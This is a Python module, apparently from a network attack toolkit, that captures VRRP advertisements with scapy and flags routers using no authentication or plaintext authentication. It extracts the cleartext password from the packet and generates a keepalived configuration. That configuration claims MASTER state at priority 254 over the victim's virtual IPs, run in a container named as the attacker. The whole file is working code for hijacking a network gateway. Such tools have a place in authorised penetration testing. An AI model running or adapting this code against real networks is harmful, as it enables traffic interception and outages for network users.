from scapy.all import *
import sys
import subprocess
sys.path.append("..")
import protocol_parser
from protocols.vrrp_packet import VRRP_PACKET
from state import user_var

docker_image = 'osixia/keepalived:2.0.19'
docker_capabilities = ['NET_ADMIN', 'NET_RAW', 'SYS_ADMIN']
docker_container_name = 'routopsy-vrrp-attacker'
docker_mounted_file_path = '/usr/local/etc/keepalived/keepalived.conf'

def detect_if_vulnerable(packet):
    if hasattr(packet['VRRP'],'authtype'):
        #   three types of authentication:
        #   0 - No Authentication (can attack)
        #   1 - Simple Authentication (can attack)
        #   2 - IP Authentication header (can't attack at the current moment)
        if ((packet['VRRP'].authtype == 0 or packet['VRRP'].authtype == 1) and packet['VRRP'].priority < 254):
            return True
        else:
            return False

def get_packet_data(packet):
    source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
    virtual_router_id = packet['VRRP'].vrid
    priority = packet['VRRP'].priority
    virtual_ip_address = packet['VRRP'].addrlist
    authentication_type = packet['VRRP'].authtype
    authentication_password = ''

    if (packet['VRRP'].authtype == 1):
        # cave man style, i am sure there is a better way to do this
        authentication_password = bytearray.fromhex(hex(packet['VRRP'].auth1)[2:]).decode() + bytearray.fromhex(hex(packet['VRRP'].auth2)[2:]).decode()
    
    advertisement_interval = packet['VRRP'].adv
    ip_count = packet['VRRP'].ipcount

    return source_mac, source_ip, destination_mac, destination_ip, virtual_router_id, priority, virtual_ip_address, authentication_type, authentication_password, advertisement_interval, ip_count

def build_configuration(data):
    configuration_file = ''
    configuration_file += 'vrrp_instance VI_1 {\n'
    configuration_file += '    interface {}\n'.format(user_var.interface)
    configuration_file += '    state MASTER\n'
    configuration_file += '    virtual_router_id {}\n'.format(data.virtual_router_id)
    configuration_file += '    priority {}\n'.format(254)

    if data.authentication_type == 1:
        configuration_file += '    authentication {\n'
        configuration_file += '        auth_type PASS\n'
        configuration_file += '        auth_pass {}\n'.format(data.authentication_password)
        configuration_file += '    }\n'
    configuration_file += '    virtual_ipaddress {\n'
    for ip in data.virtual_ip_address:
        configuration_file += '        {}\n'.format(ip)
    configuration_file += '    }\n'
    configuration_file += '}\n'

    return configuration_file